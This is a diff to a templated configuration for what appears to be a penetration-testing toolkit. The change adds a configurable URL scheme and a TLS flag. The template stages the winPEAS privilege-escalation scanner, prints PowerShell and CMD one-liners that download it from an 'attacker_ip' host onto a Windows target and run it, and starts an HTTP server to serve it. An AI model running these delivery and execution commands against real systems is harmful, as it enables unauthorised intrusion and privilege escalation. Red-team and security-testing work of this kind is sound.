@@ -9,13 +9,13 @@ content: |
   mkdir -p packstation/outbound; bash -c 'cp -n {{ tools_dir }}/winpeas/* packstation/outbound'; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                      -----PowerShell-----                      '; \
-  printf '%s\n' 'Deliver only (x64): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/winPEASx64.exe -Outfile {{ delivery_path_windows }}\winPEAS.exe'; \
-  printf '%s\n' 'Deliver only (x86): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/winPEASx86.exe -Outfile {{ delivery_path_windows }}\winPEAS.exe'; \
+  printf '%s\n' 'Deliver only (x64): iwr -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/winPEASx64.exe -Outfile {{ delivery_path_windows }}\winPEAS.exe'; \
+  printf '%s\n' 'Deliver only (x86): iwr -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/winPEASx86.exe -Outfile {{ delivery_path_windows }}\winPEAS.exe'; \
   printf '%s\n' 'Execute only: {{ delivery_path_windows }}\winPEAS.exe cmd'; \
   printf '%s\n' 'Execute and Save to file: {{ delivery_path_windows }}\winPEAS.exe cmd > {{ delivery_path_windows }}\report.txt'; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                         -----CMD-----                          '; \
-  printf '%s\n' 'Deliver only (x64): powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/winPEASx64.exe -Outfile {{ delivery_path_windows }}\winPEAS.exe'; \
-  printf '%s\n' 'Deliver only (x86): powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/winPEASx86.exe -Outfile {{ delivery_path_windows }}\winPEAS.exe'; \
+  printf '%s\n' 'Deliver only (x64): powershell wget -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/winPEASx64.exe -Outfile {{ delivery_path_windows }}\winPEAS.exe'; \
+  printf '%s\n' 'Deliver only (x86): powershell wget -uri {{ delivery_outbound_scheme }}://{{ attacker_ip }}:{{ delivery_outbound_port }}/winPEASx86.exe -Outfile {{ delivery_path_windows }}\winPEAS.exe'; \
   printf '%s\n' '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }} {{ delivery_tls_flag }}
